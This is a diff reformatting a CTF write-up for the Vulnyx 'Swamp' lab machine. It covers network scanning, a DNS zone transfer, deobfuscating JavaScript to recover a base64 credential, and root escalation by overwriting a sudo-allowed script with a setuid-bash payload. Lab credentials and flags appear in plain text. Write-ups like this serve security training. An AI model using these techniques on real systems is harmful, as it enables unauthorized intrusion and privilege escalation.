@@ -1,24 +1,32 @@
-# 🖥️ Writeup - Swamp 
+---
+icon: linux
+---
 
-**Platform:** Vulnyx  
-**Operating System:** Linux  
+# Swamp ​​
 
-> **Tags:** `Linux` `DNS Zone Transfer` `AXFR` `JavaScript Deobfuscation` `Source Code` `Base64` `Sudoers` `Writable Script` 
+## 🖥️ Writeup - Swamp
 
-# INSTALLATION
+**Platform:** Vulnyx\
+**Operating System:** Linux
+
+> **Tags:** `Linux` `DNS Zone Transfer` `AXFR` `JavaScript Deobfuscation` `Source Code` `Base64` `Sudoers` `Writable Script`
+
+## INSTALLATION
 
 We download the `zip` containing the `.ova` of the Swamp machine, extract it, and import it into VirtualBox.
 
 We configure the network interface of the Swamp machine and run it alongside the attacker machine.
 
-# HOST DISCOVERY
+## HOST DISCOVERY
 
 At this point, we still don’t know which `IP` address is assigned to Swamp, so we discover it as follows:
 
 ```bash
 netdiscover -i eth1 -r 10.0.0.0/16
 ```
+
 Info:
+
 ```
 Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                                
@@ -30,23 +38,24 @@ Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts
  10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
  10.0.4.3        08:00:27:22:43:7a      1      60  PCS Systemtechnik GmbH      
  10.0.4.21       08:00:27:7f:d5:63      1      60  PCS Systemtechnik GmbH
- ```
+```
 
 We identify with high confidence that the victim’s IP is `10.0.4.21`.
 
-# PORT SCANNING
+## PORT SCANNING
 
 Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.21
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,53,80 --min-rate 5000 10.0.4.21
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-10 17:31 CEST
 Nmap scan report for 10.0.4.21
@@ -85,6 +94,7 @@ sudo nano /etc/hosts
 ```
 
 Info:
+
 ```
 127.0.0.1	localhost
 127.0.1.1	kali
@@ -97,14 +107,13 @@ ff02::2 ip6-allrouters
 
 After refreshing the browser, the web page loads, but nothing interesting is displayed.
 
-# GOBUSTER
+## GOBUSTER
 
 We proceed with `directory fuzzing` to identify hidden directories or files, but no results are found.
 
 ```bash
 gobuster dir -u http://swamp.nyx -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
 ```
-
 
 Next, we attempt to enumerate `subdomains`, leveraging the open port `53` (`DNS`).
 
@@ -113,6 +122,7 @@ dig @10.0.4.21 swamp.nyx AXFR
 ```
 
 Info:
+
 ```
 ; <<>> DiG 9.20.11-4+b1-Debian <<>> @10.0.4.21 swamp.nyx AXFR
 ; (1 server found)
@@ -144,7 +154,6 @@ eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a
 ```
 
 After deobfuscating the code, the result is as follows.
-
 
 ```js
 !function()
@@ -316,7 +325,7 @@ console.log($.next().value),console.log($.next().value),console.log($.next().val
 	let f=JSON.parse('
 		{
 		"name":"Shrek","age":30
-``` 
+```
 
 We find a password value that looks like a Base64-encoded string:
 
@@ -324,13 +333,12 @@ We find a password value that looks like a Base64-encoded string:
 c2hyZWs6cHV0b3Blc2FvZWxhc25v
 ```
 
-
-
-```bash 
+```bash
 echo "c2hyZWs6cHV0b3Blc2FvZWxhc25v" | base64 -d
 ```
 
 Info:
+
 ```
 shrek:putopesaoelasno
 ```
@@ -345,15 +353,16 @@ Inside the `/home/shrek` directory, we find the `user flag`.
 7d199d72f12135ef193ad19faf9468ef
 ```
 
-# PRIVILEGE ESCALATION
+## PRIVILEGE ESCALATION
 
 We check for `sudo` privileges, `SUID` binaries, and `Capabilities`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for shrek on swamp:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
@@ -362,8 +371,7 @@ User shrek may run the following commands on swamp:
     (ALL) NOPASSWD: /home/shrek/header_checker
 ```
 
-We discover that we can execute the `header_checker` binary with `root` privileges. 
-Therefore, we attempt to modify it so that it executes arbitrary code. 
+We discover that we can execute the `header_checker` binary with `root` privileges. Therefore, we attempt to modify it so that it executes arbitrary code.
 
 ```bash
 printf '#!/bin/bash\nchmod u+s /bin/bash\n' > header_checker
@@ -382,6 +390,7 @@ bash -p
 ```
 
 Info:
+
 ```
 bash-5.2# whoami
 root
@@ -393,4 +402,3 @@ We find the `root flag` inside the `/root` directory.
 ```
 9c7bddee2e2fb8ad03854f106f23c6b5
 ```
-
